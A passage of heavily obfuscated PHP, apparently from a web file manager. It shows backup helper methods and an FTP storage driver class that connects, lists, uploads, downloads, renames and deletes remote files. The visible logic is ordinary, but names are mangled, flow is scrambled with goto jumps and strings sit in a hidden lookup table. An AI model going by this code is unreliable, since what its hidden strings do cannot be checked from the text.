($e¹‹ÃÇÚ²¯[$b¯©—ƒòÁ«[289]][$b¯©—ƒòÁ«[716]][$b¯©—ƒòÁ«[711]] == $b¯©—ƒòÁ«[86]) { return !0; } goto e©ŠÄñÌñ®; Cë«‹ä„Ù: } public function dbFile() { goto aƒóÊŠ¡‰; a‰¹µõï¬à: $cù½åÌËÓ‘ = new BackupDbFile(); if (!$cù½åÌËÓ‘->index()) { return !1; } self::set(array($BçÆÈš°ïÙ[729] => 1)); goto c™××ƒøÅŠ; aƒóÊŠ¡‰: $BçÆÈš°ïÙ =& $_SERVER[ÉóçÄÇ]; $eÑæÑ‡Ì¼ = self::get(); if ($eÑæÑ‡Ì¼[$BçÆÈš°ïÙ[289]][$BçÆÈš°ïÙ[719]][$BçÆÈš°ïÙ[711]] == $BçÆÈš°ïÙ[86]) { return !0; } goto a‰¹µõï¬à; c™××ƒøÅŠ: return !0; goto aÆÍ…˜–“¢; aÆÍ…˜–“¢: } public function file() { $FØ°Ò¢ä =& $_SERVER[ÉóçÄÇ]; $dˆ‡‹¸£š = self::get(); if ($dˆ‡‹¸£š[$FØ°Ò¢ä[289]][$FØ°Ò¢ä[173]][$FØ°Ò¢ä[711]] == $FØ°Ò¢ä[86]) { return !0; } if (!isset($dˆ‡‹¸£š[$FØ°Ò¢ä[714]]) || $dˆ‡‹¸£š[$FØ°Ò¢ä[714]] == $FØ°Ò¢ä[491]) { $F­‹½šÀğ = new BackupFile(); if (!$F­‹½šÀğ->index()) { return !1; } } self::set(array($FØ°Ò¢ä[730] => 1, $FØ°Ò¢ä[711] => 1)); return !0; } } goto E’Ëê¼êÑÌ; bºã¾Ü•ë”: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($aò¢…‚õ›’) { parent::__construct(); if (count($aò¢…‚õ›’) > 0) { $this->_init($aò¢…‚õ›’); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($EÕÄõÙ’Ú¨) { $C©ÂÜÕ†¤¿ =& $_SERVER[ÉóçÄÇ]; global $config; $this->appCharset = $config[$C©ÂÜÕ†¤¿[1222]]; $this->systemCharset = $config[$C©ÂÜÕ†¤¿[1223]]; if (isset($EÕÄõÙ’Ú¨[$C©ÂÜÕ†¤¿[1224]]) && $EÕÄõÙ’Ú¨[$C©ÂÜÕ†¤¿[1224]]) { $this->systemCharset = $EÕÄõÙ’Ú¨[$C©ÂÜÕ†¤¿[1224]]; } } public function iconvApp($Aö°¶ÏŞ‰°) { return $this->iconvTo($Aö°¶ÏŞ‰°, $this->systemCharset, $this->appCharset); } public function iconvSystem($Bó°Ï¡İø) { return $this->iconvTo($Bó°Ï¡İø, $this->appCharset, $this->systemCharset); } public function getPathOuter($D˜šÁÈ‚Ãï) { goto a¡Ï‚ôÌ·Ñ; a¡Ï‚ôÌ·Ñ: $f™ƒ¡ÜÛ„å =& $_SERVER[ÉóçÄÇ]; $EĞİÛÓ ²ö = $this->iconvApp($this->pathBase); $D˜šÁÈ‚Ãï = $this->iconvApp($D˜šÁÈ‚Ãï); goto c‹µ»á¨; AôõÓ¾ä¢İ: $D˜šÁÈ‚Ãï = KodIO::clear($D˜šÁÈ‚Ãï); $D˜šÁÈ‚Ãï = substr($D˜šÁÈ‚Ãï, strlen($EĞİÛÓ ²ö)); if (empty($this->pathDriver)) { return $D˜šÁÈ‚Ãï; } goto bˆ„·ñÊˆ¸; c‹µ»á¨: if (substr($EĞİÛÓ ²ö, 0, 2) == $f™ƒ¡ÜÛ„å[1225]) { $EĞİÛÓ ²ö = BASIC_PATH . substr($EĞİÛÓ ²ö, 2); } if (substr($D˜šÁÈ‚Ãï, 0, 2) == $f™ƒ¡ÜÛ„å[1225]) { $D˜šÁÈ‚Ãï = BASIC_PATH . substr($D˜šÁÈ‚Ãï, 2); } $EĞİÛÓ ²ö = KodIO::clear($EĞİÛÓ ²ö); goto AôõÓ¾ä¢İ; bˆ„·ñÊˆ¸: return $this->pathDriver . $f™ƒ¡ÜÛ„å[8] . ltrim($D˜šÁÈ‚Ãï, $f™ƒ¡ÜÛ„å[8]); goto AÍö¶‹†¥; AÍö¶‹†¥: } private function _init($E‚Ô’„öË = array()) { $a’§ñäŞÇ‘ =& $_SERVER[ÉóçÄÇ]; if (!function_exists($a’§ñäŞÇ‘[1226])) { throw new Exception(LNG($a’§ñäŞÇ‘[1227])); } $this->config = $E‚Ô’„öË; $this->charsetReset($E‚Ô’„öË); foreach ($E‚Ô’„öË as $BäÑõí‡æí => $f³ºÈ¡ß—Õ) { if (isset($this->{$BäÑõí‡æí})) { $this->{$BäÑõí‡æí} = $f³ºÈ¡ß—Õ; } } return $this->_login($E‚Ô’„öË); } private function _login($D±‚¢éçŒœ) { goto då•õ¶íÆô; cë¸øÉ¤»ˆ: if (isset($b®„ˆÒàó¹[$A¸ƒæ“ö°ˆ])) { foreach ($b®„ˆÒàó¹[$A¸ƒæ“ö°ˆ] as $e¤Ù‰›·‘ => $a´¸“Îç¢ã) { $this->{$e¤Ù‰›·‘} = $a´¸“Îç¢ã; } return !0; } $f’¨øâéİö = parse_url(trim($this->server, $D°Â¼¾àÒ[8])); $this->host = $f’¨øâéİö[$D°Â¼¾àÒ[175]]; goto fÌïĞé ›½; cÊœ‚ğ©Ÿö: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $EÂèßà¡òŠ = $this->pasv == $D°Â¼¾àÒ[86] ? !0 : !1; @ftp_pasv($this->connect, $EÂèßà¡òŠ); goto câŒ‡ìÒé; câŒ‡ìÒé: $b®„ˆÒàó¹[$A¸ƒæ“ö°ˆ] = array($D°Â¼¾àÒ[1231] => $this->connect, $D°Â¼¾àÒ[175] => $this->host, $D°Â¼¾àÒ[174] => $this->scheme, $D°Â¼¾àÒ[176] => $this->port); return $f‰ÕÇ¡Şƒ÷; goto E°›áëãÜ; fÌïĞé ›½: $EÌ•œÏÙËù = isset($f’¨øâéİö[$D°Â¼¾àÒ[174]]) && $f’¨øâéİö[$D°Â¼¾àÒ[174]] == $D°Â¼¾àÒ[1228] ? !0 : !1; $this->scheme = $EÌ•œÏÙËù ? $D°Â¼¾àÒ[1229] : $D°Â¼¾àÒ[1230]; $this->port = isset($f’¨øâéİö[$D°Â¼¾àÒ[176]]) ? $f’¨øâéİö[$D°Â¼¾àÒ[176]] : 21; goto A§ÛÑæøĞµ; då•õ¶íÆô: $D°Â¼¾àÒ =& $_SERVER[ÉóçÄÇ]; static $b®„ˆÒàó¹ = array(); $A¸ƒæ“ö°ˆ = md5(json_encode($D±‚¢éçŒœ)); goto cë¸øÉ¤»ˆ; A§ÛÑæøĞµ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $f‰ÕÇ¡Şƒ÷ = @ftp_login($this->connect, $this->username, $this->userpass); goto cÊœ‚ğ©Ÿö; E°›áëãÜ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($b¬œ©ƒ×ö, $bè¬É“Úß = '', $EñÚÇÖ™ = REPEAT_RENAME) { if ($this->setContent($b¬œ©ƒ×ö, $bè¬É“Úß)) { return $this->getPathOuter($b¬œ©ƒ×ö); } return !1; } public function mkdir($cµ„Ø…åÈ, $dÈğòÙäÜ¸ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $cµ„Ø…åÈ = $this->iconvSystem($cµ„Ø…åÈ); if ($this->_isFolder($cµ„Ø…åÈ) || @ftp_mkdir($this->connect, $cµ„Ø…åÈ)) { return $this->getPathOuter($cµ„Ø…åÈ); } if (!$this->mkdir($this->pathFather($cµ„Ø…åÈ))) { return !1; } if ($cµ„Ø…åÈ = @ftp_mkdir($this->connect, $cµ„Ø…åÈ)) { return $this->getPathOuter($cµ„Ø…åÈ); } return !1; } public function copyFile($cÛ˜”ŸÄøã, $f»Ş’Ã»ĞÄ) { goto f³ÇÏË¡’; Fîæ Šì„: $this->tempFileRemve($d²Ï¾éìô”); return $aíö£ˆŸÂ¬; goto Aß“ƒÏˆâÆ; b‰°’—ÊÜ¯: $B½‡œöºÂ´ = $this->iconvApp($d²Ï¾éìô”); $this->download($cÛ˜”ŸÄøã, $B½‡œöºÂ´); $aíö£ˆŸÂ¬ = $this->upload($f»Ş’Ã»ĞÄ, $B½‡œöºÂ´); goto Fîæ Šì„; f³ÇÏË¡’: if (!$this->_isconn()) { return !1; } $eŠöÀåÌ‚¶ = $this->pathThis($this->iconvSystem($cÛ˜”ŸÄøã)); $d²Ï¾éìô” = $this->tempFile($eŠöÀåÌ‚¶); goto b‰°’—ÊÜ¯; Aß“ƒÏˆâÆ: } public function moveFile($aÊÔ­›ÕÉ„, $f¤ÓÛ‚–§ã) { if (!$this->_isconn()) { return !1; } $aÊÔ­›ÕÉ„ = $this->iconvSystem($aÊÔ­›ÕÉ„); $f¤ÓÛ‚–§ã = $this->iconvSystem($f¤ÓÛ‚–§ã); $bÃÛµ–Ò = @ftp_rename($this->connect, $aÊÔ­›ÕÉ„, $f¤ÓÛ‚–§ã); return $bÃÛµ–Ò ? $this->getPathOuter($f¤ÓÛ‚–§ã) : !1; } public function delFile($a«ğÊÌñœÌ) { if (!$this->_isconn()) { return !1; } $a«ğÊÌñœÌ = $this->iconvSystem($a«ğÊÌñœÌ); return @ftp_delete($this->connect, $a«ğÊÌñœÌ); } public function delFolder($fßáÓ¹Í¡) { goto d‹’Ü©â’; e„‘Øá‘ÇË: foreach ($Cƒ¤ÆÉ­… as $ešé³¦Í) { $ešé³¦Í = $this->iconvSystem($ešé³¦Í); $AÇÃÛƒ™ù™ = @ftp_rmdir($this->connect, $ešé³¦Í); if (!$AÇÃÛƒ™ù™) { return !1; } } $fßáÓ¹Í¡ = $this->iconvSystem($fßáÓ¹Í¡); return @ftp_rmdir($this->connect, $fßáÓ¹Í¡); goto cÇò´ç«Óá; d‹’Ü©â’: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Cƒ¤ÆÉ­… = $bà…êß®°Í = array(); goto BÓ±µ´É•˜; BÓ±µ´É•˜: $this->fileList($fßáÓ¹Í¡, $Cƒ¤ÆÉ­…, $bà…êß®°Í, !0); $this->listItemCache = !0; foreach ($bà…êß®°Í as $c¯‹‰Á²§×) { $ešé³¦Í = $this->iconvSystem($c¯‹‰Á²§×[$_SERVER[ÉóçÄÇ][28]]); $AÇÃÛƒ™ù™ = @ftp_delete($this->connect, $ešé³¦Í); if (!$AÇÃÛƒ™ù™) { return !1; } } goto e„‘Øá‘ÇË; cÇò´ç«Óá: } public function rename($AÙêÕÛ•–ô, $AƒÌ¿ÓÂÎ†) { goto a‰±œó£Î; F’œšªŠ™Ï: $D‚˜—åñ = $this->iconvSystem($D‚˜—åñ); $AÙêÕÛ•–ô = $this->iconvSystem($AÙêÕÛ•–ô); $A‡Òë‘Ì½« = $this->pathFather($AÙêÕÛ•–ô); goto eéòùÄ ; E˜äÊæØİ‡: return $Cßˆ‡òÖÌ‚ ? $this->getPathOuter($cé°®ŠùÕŠ) : !1; goto Bˆ¹ä„¥…Å; a‰±œó£Î: $A¬‡Ï‚° =& $_SERVER[ÉóçÄÇ]; if (!$this->_isconn()) { return !1; } $D‚˜—åñ = $this->fileNameAuto($this->pathFather($AÙêÕÛ•–ô), $AƒÌ¿ÓÂÎ†); goto F’œšªŠ™Ï; eéòùÄ : $cé°®ŠùÕŠ = rtrim($A‡Òë‘Ì½«, $A¬‡Ï‚°[8]) . $A¬‡Ï‚°[8] . $D‚˜—åñ; $Cßˆ‡òÖÌ‚ = @ftp_rename($this->connect, $AÙêÕÛ•–ô, $cé°®ŠùÕŠ); $cé°®ŠùÕŠ = $this->iconvApp($cé°®ŠùÕŠ); goto E˜äÊæØİ‡; Bˆ¹ä„¥…Å: } private function folderInfo($cæï¬¦ÅèÉ, $EÃĞ–ÙÉ¼Ÿ = false) { $eè¹¸©ËáÈ =& $_SERVER[ÉóçÄÇ]; $B÷Êõˆ… = array($eè¹¸©ËáÈ[28] => $this->pathThis($cæï¬¦ÅèÉ), $eè¹¸©ËáÈ[75] => $this->getPathOuter($eè¹¸©ËáÈ[8] . $cæï¬¦ÅèÉ), $eè¹¸©ËáÈ[29] => $eè¹¸©ËáÈ[76]); if ($EÃĞ–ÙÉ¼Ÿ) { return $B÷Êõˆ…; } $B÷Êõˆ…[$eè¹¸©ËáÈ[192]] = $B÷Êõˆ…[$eè¹¸©ËáÈ[83]] = 0; $B÷Êõˆ…[$eè¹¸©ËáÈ[193]] = $B÷Êõˆ…[$eè¹¸©ËáÈ[194]] = !0; return $B÷Êõˆ…; } private function fileInfo($Cµº¯ë”ø, $d²å‹Í‡Î‚ = false, $c¬…¿‹—µê = array()) { goto côôµÂ»‹; côôµÂ»‹: $FÅ…ºÖ¦á =& $_SERVER[ÉóçÄÇ]; $BÇ…É¾áÔ½ = array($FÅ…ºÖ¦á[28] => $this->pathThis($Cµº¯ë”ø), $FÅ…ºÖ¦á[75] => $this->getPathOuter($FÅ…ºÖ¦á[8] . $Cµº¯ë”ø), $FÅ…ºÖ¦á[29] => $FÅ…ºÖ¦á[173], $FÅ…ºÖ¦á[77] => isset($c¬…¿‹—µê[$FÅ…ºÖ¦á[77]]) ? $c¬…¿‹—µê[$FÅ…ºÖ¦á[77]] : 0, $FÅ…ºÖ¦á[167] => $this->ext($Cµº¯ë”ø)); if ($d²å‹Í‡Î‚) { return $BÇ…É¾áÔ½; } goto a»°¿¡Ö°; AÁì² ×­Å: return $BÇ…É¾áÔ½; goto cÎéœ»è‰; a»°¿¡Ö°: $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[192]] = $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[83]] = 0; $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[193]] = $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[194]] = !0; $cù°•äğ = $this->iconvSystem($Cµº¯ë”ø); goto DÎƒØÄì¤‹; DÎƒØÄì¤‹: $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[83]] = @ftp_mdtm($this->connect, $cù°•äğ); if (empty($c¬…¿‹—µê)) { $c¬…¿‹—µê = $this->objectMeta($Cµº¯ë”ø); if (!$c¬…¿‹—µê) { return $BÇ…É¾áÔ½; } } $BÇ…É¾áÔ½[$FÅ…ºÖ¦á[77]] = $c¬…¿‹—µê[$FÅ…ºÖ¦á[77]]; goto AÁì² ×­Å; cÎéœ»è‰: } public function size($eôŞ˜ù…ÜÕ) { $f»¼ÜÓ×ŠÒ = $this->objectMeta($eôŞ˜ù…ÜÕ); return $f»¼ÜÓ×ŠÒ ? $f»¼ÜÓ×ŠÒ[$_SERVER[ÉóçÄÇ][77]] : 0; } public function info($cƒœĞë‡šğ) { if ($this->isFile($cƒœĞë‡šğ)) { return $this->fileInfo($cƒœĞë‡šğ, 0); } else { if ($this->isFolder($cƒœĞë‡šğ)) { return $this->folderInfo($cƒœĞë‡šğ); } } return !1; } private function fileList($FÁê¸ŠÀ§…, &$d÷Ë•…ÕÀ®, &$A·Ğä™ìŒæ, $Dº£¾Á¤çÈ = false) { goto FÜâë»°ˆ±; FÜâë»°ˆ±: $F‰ì©¤æñ£ =& $_SERVER[ÉóçÄÇ]; $FÁê¸ŠÀ§… = $this->iconvSystem($FÁê¸ŠÀ§…); if (!$this->isFolder($FÁê¸ŠÀ§…)) { return !1; } goto eáøƒä¥ì˜; e‡ƒŸ²‚†ì: $cÇèĞ‡çŸ„ = array($F‰ì©¤æñ£[94] => 1, $F‰ì©¤æñ£[1232] => 1); foreach ($a³ï½Ä© as $b‡äâŒ«Ü) { goto bÆËŒ…æ; bÆËŒ…æ: $fó£”¶‰³Û = $this->_listItem($b‡äâŒ«Ü); if ($fó£”¶‰³Û[0] == $F‰ì©¤æñ£[717]) { continue; } $cŠˆèš“¾ = $fó£”¶‰³Û[8]; goto c¥À‚ª¼; eŠõ÷ÕÀİ±: if ($F˜“²Ò­‹„) { $d÷Ë•…ÕÀ®[] = $cŠˆèš“¾; if ($Dº£¾Á¤çÈ) { $this->fileList($cŠˆèš“¾, $d÷Ë•…ÕÀ®, $A·Ğä™ìŒæ, $Dº£¾Á¤çÈ); } continue; } $A·Ğä™ìŒæ[] = $b¡ééÆ£î; goto bùÆˆŒ’ˆå; c¥À‚ª¼: if (!$cŠˆèš“¾ || isset($cÇèĞ‡çŸ„[$cŠˆèš“¾])) { continue; } $cŠˆèš“¾ = $this->iconvApp($FÁê¸ŠÀ§… . ltrim($cŠˆèš“¾, $F‰ì©¤æñ£[8])); $b¡ééÆ£î = array($F‰ì©¤æñ£[28] => $cŠˆèš“¾, $F‰ì©¤æñ£[29] => $F‰ì©¤æñ£[173], $F‰ì©¤æñ£[77] => $fó£”¶‰³Û[4]); goto d¹Í±åèÀ®; d¹Í±åèÀ®: if (substr($b‡äâŒ«Ü, 0, 1) == $F‰ì©¤æñ£[1233]) { $b¡ééÆ£î[$F‰ì©¤æñ£[29]] = $F‰ì©¤æñ£[76]; $b¡ééÆ£î[$F‰ì©¤æñ£[77]] = 0; } $F˜“²Ò­‹„ = $b¡ééÆ£î[$F‰ì©¤æñ£[29]] == $F‰ì©¤æñ£[76] ? !0 : !1; if ($A²æ‹„“è¹) { $this->cacheMethod($F‰ì©¤æñ£[197], $cŠˆèš“¾, $F˜“²Ò­‹„); $this->cacheMethod($F‰ì©¤æñ£[198], $cŠˆèš“¾, $b¡ééÆ£î); } goto eŠõ÷ÕÀİ±; bùÆˆŒ’ˆå: } if ($A²æ‹„“è¹) { $this->cacheMethod($F‰ì©¤æñ£[197], $FÁê¸ŠÀ§…, !0); } goto E´ÆÍ¢òÒŸ; eáøƒä¥ì˜: @ftp_chdir($this->connect, $F‰ì©¤æñ£[8]); $FÁê¸ŠÀ§… = rtrim($FÁê¸ŠÀ§…, $F‰ì©¤æñ£[8]) . $F‰ì©¤æñ£[8]; check_abort(); goto dËß¿Š…£; dËß¿Š…£: $A²æ‹„“è¹ = $this->listItemCache === !1 ? !1 : !0; $a³ï½Ä© = @ftp_rawlist($this->connect, $FÁê¸ŠÀ§…); if (!$a³ï½Ä©) { $a³ï½Ä© = array(); } goto e‡ƒŸ²‚†ì; E´ÆÍ¢òÒŸ: } private function _listItem($a¹À«ÂÓá÷) { if (empty($a¹À«ÂÓá÷)) { return array(); } $dé–µÎÈÉ˜ = preg_split($_SERVER[ÉóçÄÇ][1234], $a¹À«ÂÓá÷); if (count($dé–µÎÈÉ˜) <= 9) { return $dé–µÎÈÉ˜; } $dé–µÎÈÉ˜[8] = trim(substr($a¹À«ÂÓá÷, strpos($a¹À«ÂÓá÷, $dé–µÎÈÉ˜[7]) + strlen($dé–µÎÈÉ˜[7]))); return array_splice($dé–µÎÈÉ˜, 0, 9); } public function listPath($E³ñšÉİ‘Ü, $F”ì¼ããš» = false) { goto bÌ¸Ğˆ¯‚; bÌ¸Ğˆ¯‚: $céî½¶ğ…ó =& $_SERVER[ÉóçÄÇ]; if (!$this->_isconn()) { return !1; } $D²ÜîÍô‰É = $CÛïŠÒçíä = array(); goto Eæ¥‚÷œ†è; Eæ¥‚÷œ†è: $this->fileList($E³ñšÉİ‘Ü, $D²ÜîÍô‰É, $CÛïŠÒçíä); foreach ($D²ÜîÍô‰É as $eäÆË×¼Ê => $aáÙº‹Û›) { $D²ÜîÍô‰É[$eäÆË×¼Ê] = $this->folderInfo($aáÙº‹Û›, $F”ì¼ããš»); } foreach ($CÛïŠÒçíä as $eäÆË×¼Ê => $aáÙº‹Û›) { $CÛïŠÒçíä[$eäÆË×¼Ê] = $this->fileInfo($aáÙº‹Û›[$céî½¶ğ…ó[28]], $F”ì¼ããš», $aáÙº‹Û›); } goto b·ìÒÔÔĞ; b·ìÒÔÔĞ: return array($céî½¶ğ…ó[74] => $D²ÜîÍô‰É, $céî½¶ğ…ó[73] => $CÛïŠÒçíä); goto CÃ«Ü¬¿µŒ; CÃ«Ü¬¿µŒ: } public function has($D‰§Çßšõß, $Fï÷Ò‡³±ù = false, $d¶ƒÏæƒ” = true) { goto d¶‘¤íâÄÁ; dã±®Ø¹¦Ë: $this->fileList($D‰§Çßšõß, $eñÀ–…ÊŞ¨, $aÒ´ñ†¬¼ô, $FôŸ°ùî‰—); if ($Fï÷Ò‡³±ù) { return array($A¾Š¹µŸòÈ[201] => count($aÒ´ñ†¬¼ô), $A¾Š¹µŸòÈ[202] => count($eñÀ–…ÊŞ¨)); } if ($d¶ƒÏæƒ”) { if (count($aÒ´ñ†¬¼ô)) { return !0; } } else { if (count($eñÀ–…ÊŞ¨)) { return !0; } } goto CàœïØ‰; CàœïØ‰: return !1; goto BÓßÏ‘˜´‚; d¶‘¤íâÄÁ: $A¾Š¹µŸòÈ =& $_SERVER[ÉóçÄÇ]; $eñÀ–…ÊŞ¨ = $aÒ´ñ†¬¼ô = array(); $FôŸ°ùî‰— = $Fï÷Ò‡³±ù ? !0 : !1; goto dã±®Ø¹¦Ë; BÓßÏ‘˜´‚: } public function listAll($A÷‚„¬ôò) { goto eµ¼îÏí‹œ; F£…˜‹øã®: $this->fileList($A÷‚„¬ôò, $DÕŒ’›Õ²°, $f¶Ù÷í©¾‰, !0); $fÑÁö‹“  = array(); foreach ($f¶Ù÷í©¾‰ as $D¯îë·‹á´) { $fÑÁö‹“ [$D¯îë·‹á´[$Dà‚Î„à‰‰[28]]] = $D¯îë·‹á´[$Dà‚Î„à‰‰[77]]; } goto B±ïïÁ˜’; eµ¼îÏí‹œ: $Dà‚Î„à‰‰ =& $_SERVER[ÉóçÄÇ]; if (!$this->_isconn()) { return !1; } $DÕŒ’›Õ²° = $f¶Ù÷í©¾‰ = array(); goto F£…˜‹øã®; B±ïïÁ˜’: foreach ($DÕŒ’›Õ²° as $D¯îë·‹á´) { if (is_string($D¯îë·‹á´)) { $fÑÁö‹“ [$D¯îë·‹á´] = 0; } } return $this->listAllFiles($A÷‚„¬ôò, array_keys($fÑÁö‹“ ), $fÑÁö‹“ ); goto bŠ™Ï‹ñÇØ; bŠ™Ï‹ñÇØ: } public function getContent($bœçñË’¿¯) { if (!$this->_isconn()) { return !1; } $bœçñË’¿¯ = $this->iconvSystem($bœçñË’¿¯); return $this->fileSubstr($bœçñË’¿¯); } public function setContent($E³³ÂƒÑ§, $F¸Ğæë¡ÏÍ = '') { goto b²†±é³ŞÄ; BÈ©ì¸»èŞ: file_put_contents($fÛ‰˜Š¦…, $F¸Ğæë¡ÏÍ); $DŠù±¶öÔğ = $this->upload($E³³ÂƒÑ§, $this->iconvApp($fÛ‰˜Š¦…)); $this->tempFileRemve($fÛ‰˜Š¦…); goto c©¦ª¡„¦¿; c©¦ª¡„¦¿: return $DŠù±¶öÔğ; goto E¤ĞÛ‰°œ; b²†±é³ŞÄ: if (!$this->_isconn()) { return !1; } $Eõ¡…« = $this->pathThis($this->iconvSystem($E³³ÂƒÑ§)); $fÛ‰˜Š¦… = $this->tempFile($Eõ¡…«); goto BÈ©ì¸»èŞ; E¤ĞÛ‰°œ: } public function fileSubstr($cÉóÊ†Ó³Í, $BÕÇÛöôÆ = 0, $AîÊ¢ÏÃ’° = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($cÉóÊ†Ó³Í, $BÕÇÛöôÆ, $AîÊ¢ÏÃ’°); } private function ftpRequest($A¤ì ¡Ûì­, $cœÎ±·¬Ş = 0, $DÚ­ôó‘¸µ = false) { goto DÀ‘›§„»; c·£°Œ‘İ: curl_setopt($AÆğİ’ãºÖ, CURLOPT_URL, $B‹ÂÂÛò¾¡ . $this->pathEncode($A¤ì ¡Ûì­)); curl_setopt($AÆğİ’ãºÖ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($DÚ­ôó‘¸µ) { $Dİœ »îƒ» = $cœÎ±·¬Ş + $DÚ­ôó‘¸µ - 1; curl_setopt($AÆğİ’ãºÖ, CURLOPT_RANGE, "{$cœÎ±·¬Ş}\55{$Dİœ »îƒ»}"); } goto f—ëß„Ãèô; f—ëß„Ãèô: curl_setopt($AÆğİ’ãºÖ, CURLOPT_RETURNTRANSFER, 1); $e»Í§­á£° = curl_exec($AÆğİ’ãºÖ); curl_close($AÆğİ’ãºÖ); goto F²¡ŠôÀ¡½; F²¡ŠôÀ¡½: return $e»Í§­á£°; goto Bˆ±‘éëÜ¿; DÀ‘›§„»: $A¤ì ¡Ûì­ = $this->iconvSystem($A¤ì ¡Ûì­); $B‹ÂÂÛò¾¡ = $this->scheme . $this->host . $_SERVER[ÉóçÄÇ][4] . $this->port; $AÆğİ’ãºÖ = curl_init(); goto c·£°Œ‘İ; Bˆ±‘éëÜ¿: } public function upload($fÖî‘ªÖ¿, $A¯™Äª¥¿, $a¤å‰°‡Äš = false, $C‹ÃÖ¦Œñ = REPEAT_REPLACE) { goto DÙöé½Ï; fî†«‹™: if ($EôíŠõÙË¶ != FTP_FINISHED) { return !1; } return $this->getPathOuter($fÖî‘ªÖ¿); goto c¬¸¸Î×›„; B×øŒ«î¦: $A¯™Äª¥¿ = $this->iconvSystem($A¯™Äª¥¿); $EôíŠõÙË¶ = ftp_nb_put($this->connect, $fÖî‘ªÖ¿, $A¯™Äª¥¿, FTP_BINARY); while ($EôíŠõÙË¶ == FTP_MOREDATA) { $EôíŠõÙË¶ = ftp_nb_continue($this->connect); } goto fî†«‹™; DÙöé½Ï: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($fÖî‘ªÖ¿))) { return !1; } $fÖî‘ªÖ¿ = $this->iconvSystem($fÖî‘ªÖ¿); goto B×øŒ«î¦; c¬¸¸Î×›„: } public function download($dçîºïÛ˜à, $A¬İÍê‡±á = '') { goto BÂè¦Ê™Š; f™£ŠÛÓëæ: while ($CÚ¾ÛÖ¤Õ½ == FTP_MOREDATA) { $CÚ¾ÛÖ¤Õ½ = ftp_nb_continue($this->connect); } if ($CÚ¾ÛÖ¤Õ½ != FTP_FINISHED) { return !1; } return $this->iconvApp($A¬İÍê‡±á); goto A…§Æ÷­Àæ; BÂè¦Ê™Š: if (!$this->_isconn()) { return !1; } $C¹¾Í“é¢È = $this->pathFather($A¬İÍê‡±á); if (!IO::mkdir($C¹¾Í“é¢È)) { return !1; } goto dåï½šÈªì; dåï½šÈªì: $dçîºïÛ˜à = $this->iconvSystem($dçîºïÛ˜à); $A¬İÍê‡±á = $this->iconvSystem($A¬İÍê‡±á); $CÚ¾ÛÖ¤Õ½ = ftp_nb_get($this->connect, $A¬İÍê‡±á, $dçîºïÛ˜à, FTP_BINARY); goto f™£ŠÛÓëæ; A…§Æ÷­Àæ: } public function exist($cŒ–·’ˆšå) { return $this->isFile($cŒ–·’ˆšå) || $this->isFolder($cŒ–·’ˆšå); } public function isFile($Bèò®©Äé¡) { return !$this->isFolder($Bèò®©Äé¡) && $this->objectMeta($Bèò®©Äé¡); } public function isFolder($c¨î¾™­Ì—) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][197], $c¨î¾™­Ì—); } protected function objectMeta($d‡§±ñÓÍ–) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][198], $d‡§±ñÓÍ–); } protected function _objectMeta($FØî‹ù¼ˆÀ) { goto aº“Çî¸ì£; dšö´­º®: $FØî‹ù¼ˆÀ = $this->iconvSystem($FØî‹ù¼ˆÀ); $aÕ‚ªîî  = array($EİÄœˆ§õ²[28] => $this->iconvApp($FØî‹ù¼ˆÀ), $EİÄœˆ§õ²[29] => $EİÄœˆ§õ²[173], $EİÄœˆ§õ²[77] => 0); @ftp_chdir($this->connect, $EİÄœˆ§õ²[8]); goto DÅï‡‘Ùö; aº“Çî¸ì£: $EİÄœˆ§õ² =& $_SERVER[ÉóçÄÇ]; if ($FØî‹ù¼ˆÀ == $EİÄœˆ§õ²[33] || $FØî‹ù¼ˆÀ == $EİÄœˆ§õ²[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto dšö´­º®; DÅï‡‘Ùö: $Bİ‰®È„Üã = @ftp_size($this->connect, $FØî‹ù¼ˆÀ); if ($Bİ‰®È„Üã != -1) { $aÕ‚ªîî [$EİÄœˆ§õ²[77]] = $Bİ‰®È„Üã; } else { $aöá·…× = @ftp_chdir($this->connect, $FØî‹ù¼ˆÀ); if (!$aöá·…×) { return !1; } $aÕ‚ªîî [$EİÄœˆ§õ²[29]] = $EİÄœˆ§õ²[76]; } return $aÕ‚ªîî ; goto cù£à©°á; cù£à©°á: } protected function _isFolder($dğÈ„š£œÀ) { $eæÕéµË‰© =& $_SERVER[ÉóçÄÇ]; if ($dğÈ„š£œÀ == $eæÕéµË‰©[33] || $dğÈ„š£œÀ == $eæÕéµË‰©[8]) { return !0; } $FÚ“•ŸĞ· = $this->_objectMeta($dğÈ„š£œÀ); return isset($FÚ“•ŸĞ·[$eæÕéµË‰©[29]]) && $FÚ“•ŸĞ·[$eæÕéµË‰©[29]] == $eæÕéµË‰©[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($béÜØç¯éÒ) { if (substr($béÜØç¯éÒ, 0, 2) == $_SERVER[ÉóçÄÇ][1225]) { $béÜØç¯éÒ = BASIC_PATH . substr($béÜØç¯éÒ, 2); } return $béÜØç¯éÒ; } public function iconvApp($dƒ÷Í®Îê) { $bê„«öÂ©Ô =& $_SERVER[ÉóçÄÇ]; global $config; return $this->iconvTo($dƒ÷Í®Îê, $config[$bê„«öÂ©Ô[1223]], $config[$bê„«öÂ©Ô[1222]]); } public function iconvSystem($FˆÚÄ‰¨õÕ) { $BµÈ‡¼Îõ =& $_SERVER[ÉóçÄÇ]; global $config; return 